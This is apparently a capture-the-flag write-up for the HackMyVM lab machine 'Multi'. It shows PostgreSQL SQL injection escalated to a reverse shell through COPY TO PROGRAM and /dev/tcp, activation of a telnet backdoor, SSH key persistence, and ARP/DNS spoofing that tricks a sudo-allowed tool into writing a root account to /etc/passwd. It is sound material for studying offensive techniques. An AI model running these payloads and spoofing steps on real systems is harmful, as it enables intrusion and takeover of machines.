# Multi

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.146:21
Open 10.0.2.146:22
Open 10.0.2.146:23
Open 10.0.2.146:80
Open 10.0.2.146:111
Open 10.0.2.146:2049
Open 10.0.2.146:3306
Open 10.0.2.146:139
Open 10.0.2.146:445
Open 10.0.2.146:28080
Open 10.0.2.146:46695
Open 10.0.2.146:47479
Open 10.0.2.146:50329
Open 10.0.2.146:50809
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.146
PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN/localityName=Beijing
| Issuer: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN/localityName=Beijing
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-17T11:34:00
| Not valid after:  2035-07-15T11:34:00
| MD5:   aca8:6fab:1090:74a5:f472:00fe:0ca2:ef45
| SHA-1: 7124:67d0:3c52:a28f:af8f:11f9:d1d7:1908:a120:3549
| -----BEGIN CERTIFICATE-----
| MIIDnzCCAoegAwIBAgIUYCaKWB1qw9FL0BZJzrBHK25W5X4wDQYJKoZIhvcNAQEL
| BQAwXzELMAkGA1UEBhMCQ04xEDAOBgNVBAgMB0JlaWppbmcxEDAOBgNVBAcMB0Jl
| aWppbmcxFzAVBgNVBAoMDk15T3JnYW5pemF0aW9uMRMwEQYDVQQDDApmdHAtc2Vy
| dmVyMB4XDTI1MDcxNzExMzQwMFoXDTM1MDcxNTExMzQwMFowXzELMAkGA1UEBhMC
| Q04xEDAOBgNVBAgMB0JlaWppbmcxEDAOBgNVBAcMB0JlaWppbmcxFzAVBgNVBAoM
| Dk15T3JnYW5pemF0aW9uMRMwEQYDVQQDDApmdHAtc2VydmVyMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEApaNvI8FgWdbUp+a9fBtlIUa3p2RaqUtDJPPG
| 0EHh5YI1fmiFexDdktkw2J52M6EtI/YyAXhCrvS6jqHejn/HDjBwzfXfSNNkB6UP
| A6uZ733Tkdhy/5wxegstgG8EcThkOOtBWxNnQwW305q6AFp7WFKfkQpy5I95q2M8
| KGeS22Bu+6AcabME/4gVjbbNgCAksgmmrFLWhPMWrAvZzW2LaLiAMAn8QF79ehBC
| xw7OOHkoZzUIb61z8wWP608bl4t/SZLCAu2gUUgffYyUW841SNLxkrn7k0e3abKL
| k0plUnTWlotPSQJsLVat4cDRUcduSrGAJ1p5heDFiYon9kltkwIDAQABo1MwUTAd
| BgNVHQ4EFgQUStAEbUQlglmNtdzQ0cyXjGn7/L0wHwYDVR0jBBgwFoAUStAEbUQl
| glmNtdzQ0cyXjGn7/L0wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAEHOpVuJjJsw55QH9C6toYDqF2R1kbVAVwSnt1Pz76lB7/Tie2L0h1zpKrUzv
| upLkhFdBhIpaZJs7N+xv42NwNB0VWGPwaJEc81VrCJcYjS/vWAOZsaki8a/57g+8
| zPtm/VTcGMv1fC2IT7XdJ5vRuoGoOKWcOcOMyKPBn8TDSiGH1c3WJiC7zIuO35nI
| RPzfHHQ+buoSvrzinN/gXcT1GIkOPYW1kZe0A+13yf0T5x4SxMxROe3luI46pK3W
| NeHeX1S729gMB5sVdLu821BROqW+p7R6Wj9DUv/xWU8bN/8BrUPZOyzoSPLNLDfy
| 3EBqovSVBxsmhuqokSu7WvTRug==
|_-----END CERTIFICATE-----
22/tcp    open  ssh         syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
23/tcp    open  telnet      syn-ack Linux telnetd
80/tcp    open  http        syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45531/tcp6  mountd
|   100005  1,2,3      50445/udp   mountd
|   100005  1,2,3      50809/tcp   mountd
|   100005  1,2,3      59128/udp6  mountd
|   100021  1,3,4      34523/tcp6  nlockmgr
|   100021  1,3,4      44650/udp   nlockmgr
|   100021  1,3,4      46134/udp6  nlockmgr
|   100021  1,3,4      46695/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 4
445/tcp   open  netbios-ssn syn-ack Samba smbd 4
2049/tcp  open  nfs         syn-ack 3-4 (RPC #100003)
3306/tcp  open  mysql       syn-ack MariaDB 10.3.23 or earlier (unauthorized)
28080/tcp open  http        syn-ack Werkzeug httpd 3.1.3 (Python 3.9.2)
| http-methods: 
|_  Supported Methods: OPTIONS POST GET HEAD
|_http-title: Admin Panel
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
46695/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
47479/tcp open  mountd      syn-ack 1-3 (RPC #100005)
50329/tcp open  mountd      syn-ack 1-3 (RPC #100005)
50809/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: MULTI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   MULTI<00>            Flags: <unique><active>
|   MULTI<03>            Flags: <unique><active>
|   MULTI<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   SECUREGROUP<00>      Flags: <group><active>
|   SECUREGROUP<1d>      Flags: <unique><active>
|   SECUREGROUP<1e>      Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-12-19T13:56:38
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32918/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31804/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64641/udp): CLEAN (Failed to receive data)
|   Check 4 (port 24038/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

## HTTP (80)

```bash
â””â”€$ feroxbuster -u http://10.0.2.146 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET      366l      933w    10699c http://10.0.2.146/index.html
301      GET        9l       28w      306c http://10.0.2.146/pub => http://10.0.2.146/pub/
```

```html
â””â”€$ curl http://10.0.2.146/pub/ -i
HTTP/1.1 200 OK
Date: Fri, 19 Dec 2025 13:58:58 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 18 Jul 2025 15:38:24 GMT
ETag: "e6-63a35ea9ec6bf"
Accept-Ranges: bytes
Content-Length: 230
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nothing Here</title>
</head>
<body>
    <p>Nothing here</p>
</body>
</html>
```

```bash
â””â”€$ feroxbuster -u http://10.0.2.146 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Nothing new
```

## HTTP (28080)

Another HTTP server

![writeup.png](/assets/pentest/hackmyvm/multi/writeup.png)

### SQLi

![writeup-1.png](/assets/pentest/hackmyvm/multi/writeup-1.png)

I thought it would be `MySQL`, but it's Postgres!
```bash
â””â”€$ curl 'http://10.0.2.146:28080/search' -sLb 'session=eyJ1c2VyIjoiaGVsbG8ifQ.aUVcKA.7G0izs5755hKN7YCe8Cqm5Zk78A' --data-urlencode "keyword=x' UNION SELECT NULL,NULL,version()  -- -" | htmlq td:last-child -t
PostgreSQL 13.16 (Debian 13.16-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
```

- [https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/PostgreSQL%20Injection/#postgresql-enumeration](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/PostgreSQL%20Injection/#postgresql-enumeration)

```bash
â””â”€$ sqli() { curl 'http://10.0.2.146:28080/search' -sLb 'session=eyJ1c2VyIjoiaGVsbG8ifQ.aUVcKA.7G0izs5755hKN7YCe8Cqm5Zk78A' --data-urlencode "keyword=x' UNION SELECT NULL,NULL,$1 -- -"  | htmlq td:last-child -t;  }

â””â”€$ sqli 'CURRENT_DATABASE()'
dvtest

â””â”€$ sqli 'CURRENT_SCHEMA()'
public

â””â”€$ sqli 'user'
dvuser

â””â”€$ sqli "STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema=CURRENT_SCHEMA()"
users
```

We already got users, so the database is empty...

### RCE

ðŸ‘€
```bash
â””â”€$ sqli "current_setting('is_superuser')"
on
```

```bash
â””â”€$ curl 'http://10.0.2.146:28080/search' -sLb 'session=eyJ1c2VyIjoiaGVsbG8ifQ.aUVcKA.7G0izs5755hKN7YCe8Cqm5Zk78A' --data-urlencode "keyword=admin'; COPY (SELECT '') to PROGRAM 'wget 10.0.2.15'; -- -"
DETAIL:  command not found
â””â”€$ curl 'http://10.0.2.146:28080/search' -sLb 'session=eyJ1c2VyIjoiaGVsbG8ifQ.aUVcKA.7G0izs5755hKN7YCe8Cqm5Zk78A' --data-urlencode "keyword=admin'; COPY (SELECT '') to PROGRAM 'curl 10.0.2.15'; -- -"
Query failed: no results to fetch
---
â””â”€$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.146 - - [19/Dec/2025 09:42:26] "GET / HTTP/1.1" 200 -
```

```bash
â””â”€$ curl 'http://10.0.2.146:28080/search' -sLb 'session=eyJ1c2VyIjoiaGVsbG8ifQ.aUVcKA.7G0izs5755hKN7YCe8Cqm5Zk78A' --data-urlencode "keyword=admin'; COPY (SELECT '') to PROGRAM '/bin/bash -c \"/bin/bash -i >&/dev/tcp/10.0.2.15/4444 0>&1\"'; -- -"
---
â””â”€$ penelope -p 4444
postgres@Multi:/var/lib/postgresql/13/main$ id
uid=112(postgres) gid=119(postgres) groups=119(postgres),112(ssl-cert)
```

## Lateral Movement (xiao)

```bash
postgres@Multi:/var/lib/postgresql/13/main$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
xiao:x:1001:1001::/home/xiao:/bin/bash
secure_user:x:1002:1002::/home/secure_user:/bin/bash
postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
todd:x:1000:1000:,,,:/home/todd:/bin/bash
```

Source code
```python
postgres@Multi:/$ cat /opt/app.py
from flask import Flask, request, render_template_string, redirect, session
import psycopg2

app = Flask(__name__)
app.secret_key = "s3cret_key"

# Database connection
conn = psycopg2.connect(
    dbname="dvtest",
    user="dvuser",
    password="dvpass",
    host="localhost",
    port="5432"
)

# HTML template with search form
TEMPLATE = """
<!doctype html>
<html>
<head>
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>Welcome{% if user %}, {{ user }}{% endif %}</h2>
    {% if not user %}
        <form method="POST" action="/">
            Username: <input name="username" required>
            <input type="submit" value="Login">
        </form>
    {% else %}
        <p><a href="/search">User Search</a> | <a href="/logout">Logout</a></p>
        <form method="POST" action="/search">
            Search User: <input name="keyword" placeholder="Enter username" value="{{ keyword|default('') }}">
            <input type="submit" value="Search">
        </form>
    {% endif %}
    {% if results %}
        <h3>Search Results</h3>
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th></tr>
            {% for row in results %}
                <tr><td>{{ row[0] }}</td><td>{{ row[1] }}</td><td>{{ row[2] }}</td></tr>
            {% endfor %}
        </table>
    {% endif %}
    {% if message %}
        <p class="error">{{ message }}</p>
    {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        if username:
            session["user"] = username
            return redirect("/search")
        return render_template_string(TEMPLATE, user=None, message="Username cannot be empty")
    return render_template_string(TEMPLATE, user=None)

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect("/")

@app.route("/search", methods=["GET", "POST"])
def search():
    if "user" not in session:
        return redirect("/")

    results = []
    message = None
    keyword = ""

    if request.method == "POST":
        keyword = request.form.get("keyword", "")
        try:
            cur = conn.cursor()
            # Vulnerable SQL query: allows injection of commands like COPY TO PROGRAM
            # Example exploit: ' OR 1=1; COPY users TO PROGRAM 'whoami'; --
            sql = f"SELECT id, username, email FROM users WHERE username LIKE '%{keyword}%'"
            cur.execute(sql)
            results = cur.fetchall()
            conn.commit()
        except Exception as e:
            conn.rollback()
            message = f"Query failed: {str(e)}"

    return render_template_string(TEMPLATE, user=session["user"], results=results, message=message, keyword=keyword)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=28080)
```

Files in `postgres` home directory
```bash
postgres@Multi:/var/lib/postgresql$ cat .psql_history
CREATE DATABASE dvtest;CREATE USER dvuser WITH PASSWORD 'dvpass';GRANT ALL PRIVILEGES ON DATABASE dvtest TO dvuser;\q
CREATE DATABASE dvtest;
CREATE USER dvuser WITH PASSWORD 'dvpass';
GRANT ALL PRIVILEGES ON DATABASE dvtest TO dvuser;

postgres@Multi:/var/lib/postgresql$ cat .bash_history
...
cat custom_login
cat /etc/default/telnet
echo 'ENABLE_BACKDOOR' > /etc/default/telnet
cd /var/www/html/
...
cd secure_share/
...
```

```bash
postgres@Multi:/var/lib/postgresql$ find / -name custom_login 2>/dev/null
/usr/local/bin/custom_login
postgres@Multi:/var/lib/postgresql$ cat /usr/local/bin/custom_login
#!/bin/bash

printf "Username: \r\n"
read -r username
username=$(echo "$username" | tr -d '\r\n' | tr -s ' ')

if [[ -z "$username" ]]; then
    printf "invalid username\r\n"
    sleep 1
    exit 1
fi

printf "Password: \r\n"
read -s -r password
password=$(echo "$password" | tr -d '\r\n')

if [[ "$username" == "xiao" ]] && [[ -z "$password" ]]; then
    if grep -q "ENABLE_BACKDOOR" /etc/default/telnet 2>/dev/null; then
        printf "login successful\r\n"
        exec /bin/login -f xiao
        exit 0
    else
        printf "backdoor disabled\r\n"
        sleep 1
        exit 1
    fi
fi

if [[ "$username" == "xiao" ]] && [[ -n "$password" ]]; then
    printf "invalid password\r\n"
    sleep 1
    exit 1
fi

printf "login failed\r\n"
sleep 1
exit 1
```

First to open "backdoor" we need to write to telnet file (it's empty)
```bash
postgres@Multi:/var/lib/postgresql$ ls -l /etc/default/telnet
-rw-rw-rw- 1 root root 0 Aug  3 09:06 /etc/default/telnet
postgres@Multi:/var/lib/postgresql$ echo 'ENABLE_BACKDOOR' > /etc/default/telnet
```

The telnet only validates username, not password (well it's Null Password so...).
```bash
â””â”€$ telnet 10.0.2.146
Trying 10.0.2.146...
Connected to 10.0.2.146.
Escape character is '^]'.
Username:
xiao
Password: # NULL PASSWORD; Just press enter
login successful
Linux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
Your session is being monitored per security policy
xiao@Multi:~$ id
uid=1001(xiao) gid=1001(xiao) groups=1001(xiao)
```

## SSH (xiao)

Setup persistence
```bash
â””â”€$ ssh-keygen -f id_rsa -P x -q
â””â”€$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaQ9wOAtTLFZ1scOf2QWJvlZ/QY+sZWOdApkz/9xPgq woyag@kraken' >> ~/.ssh/authorized_keys
---
xiao@Multi:~$ mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaQ9wOAtTLFZ1scOf2QWJvlZ/QY+sZWOdApkz/9xPgq woyag@kraken' >> ~/.ssh/authorized_keys
```

### User.txt

```bash
xiao@Multi:~$ cat user.txt
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
```

## Privilege Escalation (todd)

Policies?
```bash
xiao@Multi:~$ sudo -l
Sudo access restricted by policy (CODE:0x7E3) -l
```

Anyway while inspecting the `/var/www` we can notice that current user owns `/pub`, previously enumerated directory.
```bash
xiao@Multi:~$ find /var/www/html/ -ls
   290379      4 drwxr-xr-x   3 root     root         4096 Jul 17 09:05 /var/www/html/
   295214     12 -rw-r--r--   1 www-data www-data    10699 Jul 17 07:55 /var/www/html/index.html
   267779      4 drwxr-xr-x   2 xiao     www-data     4096 Aug  3 09:04 /var/www/html/pub
   265420      4 -rw-r--r--   1 root     root           72 Aug  3 09:04 /var/www/html/pub/.htaccess
   286861      4 -rw-r--r--   1 root     root          230 Jul 18 11:38 /var/www/html/pub/index.html
   290926      4 -rw-------   1 www-data www-data       19 Jul 17 09:06 /var/www/html/pub/.passowrd_creds
```

The password file is only readable to `www-data` (server), but it's also writeable by us.

```bash
â””â”€$ curl 'http://10.0.2.146/pub/.passowrd_creds' -Is | head -1
HTTP/1.1 403 Forbidden
---
xiao@Multi:~$ cat /var/www/html/pub/.htaccess
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
xiao@Multi:~$ rm /var/www/html/pub/.htaccess -f
xiao@Multi:~$ wget 'http://127.0.0.1/pub/.passowrd_creds' -qO-
koUF5q)*RN&m0PTB&D
```

> Creds: `todd:koUF5q)*RN&m0PTB&D`

```bash
â””â”€$ sshpass -p 'koUF5q)*RN&m0PTB&D' ssh todd@10.0.2.146
todd@Multi:~$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

## Privilege Escalation (root)

```bash
todd@Multi:~$ sudo -l
Matching Defaults entries for todd on Multi:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", mail_badpass

Runas and Command-specific defaults for todd:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User todd may run the following commands on Multi:
    (ALL : ALL) NOPASSWD: /usr/bin/cupp
```

- **[cupp](https://github.com/Mebus/cupp)**: Common User Passwords Profiler (CUPP)

The only valid thing with cupp we can do is use `-l`, other options generate passwords and is not ideal for reading files.
```bash
todd@Multi:~$ sudo cupp -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ...
[+] Downloading dictionaries/Moby/mlang.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mlang.tar.gz ...
[+] Downloading dictionaries/Moby/moby.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/moby.tar.gz ...
[+] Downloading dictionaries/Moby/mpos.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mpos.tar.gz ...
[+] Downloading dictionaries/Moby/mpron.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mpron.tar.gz ...
[+] Downloading dictionaries/Moby/mthes.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mthes.tar.gz ...
[+] Downloading dictionaries/Moby/mwords.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mwords.tar.gz ...
[+] files saved to dictionaries/Moby/
todd@Multi:~$ find dictionaries/ -ls
   527406      4 drwxr-xr-x   3 root     root         4096 Dec 19 10:41 dictionaries/
   527420      4 drwxr-xr-x   2 root     root         4096 Dec 19 10:42 dictionaries/Moby
   527429   9648 -rw-r--r--   1 root     root      9877812 Dec 19 10:42 dictionaries/Moby/mthes.tar.gz
   527430   2840 -rw-r--r--   1 root     root      2908131 Dec 19 10:42 dictionaries/Moby/mwords.tar.gz
   527426    888 -rw-r--r--   1 root     root       907919 Dec 19 10:41 dictionaries/Moby/mpos.tar.gz
   527425  19876 -rw-r--r--   1 root     root     20351163 Dec 19 10:41 dictionaries/Moby/moby.tar.gz
   527427   2320 -rw-r--r--   1 root     root      2373185 Dec 19 10:41 dictionaries/Moby/mpron.tar.gz
   527424   1476 -rw-r--r--   1 root     root      1508938 Dec 19 10:41 dictionaries/Moby/mlang.tar.gz
   527423    700 -rw-r--r--   1 root     root       714450 Dec 19 10:41 dictionaries/Moby/mhyph.tar.gz
```

However what good does downloading files give?

DNS is not writable
```bash
todd@Multi:~$ ls -alh /etc/hosts /etc/resolv.conf
-rw-r--r-- 1 root root 185 Jul 17 07:28 /etc/hosts
-rw-r--r-- 1 root root  23 Dec 20 00:13 /etc/resolv.conf
```

Hint?
```bash
todd@Multi:~$ find / -name secure_share 2>/dev/null
/srv/secure_share

todd@Multi:~$ find /srv/ -ls
  1308162      4 drwxr-xr-x   5 root     root         4096 Jul 17 07:40 /srv/
  1308164      4 drwxr-xr-x   2 root     root         4096 Jul 18 11:22 /srv/secure_share
  1308166      4 -rwxr-xr-x   1 root     root          159 Jul 18 11:22 /srv/secure_share/bettercap
  1308165      4 drwxrwxrwt   2 nobody   nogroup      4096 Jul 17 07:40 /srv/nfs_secure
  1308163      4 drwxr-xr-x   2 root     ftp          4096 Jul 17 07:33 /srv/ftp
```

- [DNS Spoofer](https://medium.com/@sebastienwebdev/dns-spoofer-f337bb85c567)
- [https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/](https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/)
- [https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/)

```bash
â””â”€$ sudo bettercap
10.0.2.0/24 > 10.0.2.15  Â» [00:31:32] [sys.log] [inf] gateway monitor started ...
10.0.2.0/24 > 10.0.2.15  Â» set arp.spoof.targets 10.0.2.146
10.0.2.0/24 > 10.0.2.15  Â» set dns.spoof.domains ftp.funet.fi
10.0.2.0/24 > 10.0.2.15  Â» set dns.spoof.address 10.0.2.15
10.0.2.0/24 > 10.0.2.15  Â» dns.spoof on
[00:31:57] [sys.log] [inf] dns.spoof ftp.funet.fi -> 10.0.2.15
10.0.2.0/24 > 10.0.2.15  Â» [00:31:57] [sys.log] [inf] dns.spoof starting net.recon as a requirement for dns.spoof
10.0.2.0/24 > 10.0.2.15  Â» [00:31:57] [endpoint.new] endpoint 10.0.2.3 detected as 08:00:27:f6:d4:45 (PCS Systemtechnik GmbH).
10.0.2.0/24 > 10.0.2.15  Â» [00:31:57] [endpoint.new] endpoint 10.0.2.146 detected as 08:00:27:91:05:a9 (PCS Systemtechnik GmbH).
10.0.2.0/24 > 10.0.2.15  Â» arp.spoof on
10.0.2.0/24 > 10.0.2.15  Â» [00:32:02] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
10.0.2.0/24 > 10.0.2.15  Â» [00:32:05] [sys.log] [inf] dns.spoof sending spoofed DNS reply for ftp.funet.fi (->10.0.2.15) to 10.0.2.146 : 08:00:27:91:05:a9 (PCS Systemtechnik GmbH).
10.0.2.0/24 > 10.0.2.15  Â» [00:32:05] [sys.log] [inf] dns.spoof sending spoofed DNS reply for ftp.funet.fi (->10.0.2.15) to 10.0.2.146 : 08:00:27:91:05:a9 (PCS Systemtechnik GmbH).
```

![writeup-2.png](/assets/pentest/hackmyvm/multi/writeup-2.png)

Ok, so the spoofing is successful
```bash
â””â”€$ mkdir -p pub/unix/security/passwd/crack/dictionaries/Moby/
â””â”€$ sshpass -p 'koUF5q)*RN&m0PTB&D' scp todd@10.0.2.146:/etc/passwd pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz
â””â”€$ echo "letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash" >> pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz
---
â””â”€$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
---
todd@Multi:/tmp$ cupp -l
> Enter number: 1
...
todd@Multi:/tmp$ cat dictionaries/Moby/mhyph.tar.gz  | tail -1
letmein:$6$szol8kPiriu.iJ3R$5Ch1ksmm8B/dOxkD1Yge2Bc2KdfqiGgRKz3FvPp3Kqe5gEUmCsawxrRLIG3Kl69v7t8jv99RlYDvuKF.D81ya0:0:0:letmein:/root:/bin/bash
```

Symlinks are writable
```bash
todd@Multi:/tmp$ ln -s dictionaries/Moby/mlang.tar.gz /tmp/hello
---
â””â”€$ cp mhyph.tar.gz mlang.tar.gz
todd@Multi:/tmp$ cupp -l
> Enter number: 1
...
todd@Multi:/tmp$ tail -1 /tmp/hello
letmein:$6$szol8kPiriu.iJ3R$5Ch1ksmm8B/dOxkD1Yge2Bc2KdfqiGgRKz3FvPp3Kqe5gEUmCsawxrRLIG3Kl69v7t8jv99RlYDvuKF.D81ya0:0:0:letmein:/root:/bin/bash
```

Hmmm
```bash
todd@Multi:/tmp$ ln -sf dictionaries/Moby/moby.tar.gz /etc/passwd
ln: failed to create symbolic link '/etc/passwd': Permission denied
```

Hm?
```bash
todd@Multi:/tmp$ ln -s /etc/passwd dictionaries/Moby/moby.tar.gz
todd@Multi:/tmp$ ls -l dictionaries/Moby/moby.tar.gz
lrwxrwxrwx 1 todd todd 11 Dec 20 00:44 dictionaries/Moby/moby.tar.gz -> /etc/passwd

â””â”€$ cp mhyph.tar.gz moby.tar.gz
```

Any day I use `ln` I'm forget how it works...

```bash
â””â”€$ cp mhyph.tar.gz mlang.tar.gz
todd@Multi:/tmp$ cupp -l
